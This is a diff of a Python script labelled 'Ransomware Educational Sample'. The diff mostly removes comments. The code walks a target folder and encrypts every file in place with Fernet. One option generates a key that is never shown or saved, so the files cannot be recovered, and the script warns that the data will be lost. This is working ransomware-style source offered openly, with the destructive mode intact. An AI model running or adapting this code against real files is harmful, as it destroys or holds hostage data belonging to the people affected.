@@ -2,9 +2,7 @@ import os
 import shutil
 from cryptography.fernet import Fernet
 
-# Function to backup a file
 def backup_file(file_path, backup_folder, target_folder):
-    # Create the backup folder structure if it doesn't exist
     relative_path = os.path.relpath(file_path, start=target_folder)
     backup_path = os.path.join(backup_folder, relative_path)
     if not os.path.exists(backup_path):
@@ -13,13 +11,11 @@ def backup_file(file_path, backup_folder, target_folder):
     else:
         print(f"Backup folder already exists: {backup_path}")
 
-# Function to store encryption key in the backup folder
 def store_key_in_backup(key, backup_folder):
     key_file_path = os.path.join(backup_folder, 'encryption_key.txt')
     with open(key_file_path, 'w') as key_file:
         key_file.write(key.decode())
 
-# Function to encrypt a file
 def encrypt_file(file_path, cipher, backup_enabled, backup_folder, target_folder):
     if backup_enabled:
         backup_file(file_path, backup_folder, target_folder)
@@ -29,15 +25,13 @@ def encrypt_file(file_path, cipher, backup_enabled, backup_folder, target_folder
     with open(file_path, 'wb') as file:
         file.write(encrypted_data)
 
-# Function to decrypt a file
 def decrypt_file(file_path, cipher):
     with open(file_path, 'rb') as file:
         encrypted_data = file.read()
     decrypted_data = cipher.decrypt(encrypted_data)
     with open(file_path, 'wb') as file:
         file.write(decrypted_data)
-
-# Main function to handle user input
+        
 def main():
     print("*****Ransomware Educational Sample*****")
     print(" ")
@@ -76,8 +70,8 @@ def main():
             else:
                 confirmation = input("Warning: You will not be able to decrypt the encrypted files anymore. The data will be lost. Do you want to continue? (yes/no): ").lower()
                 if confirmation == 'yes':
-                    cipher = Fernet.generate_key()  # Generate key for encryption but don't display it
-                    cipher = Fernet(cipher)  # Convert key to Fernet object
+                    cipher = Fernet.generate_key()
+                    cipher = Fernet(cipher)
                     for root, dirs, files in os.walk(target_folder):
                         for file in files:
                             file_path = os.path.join(root, file)
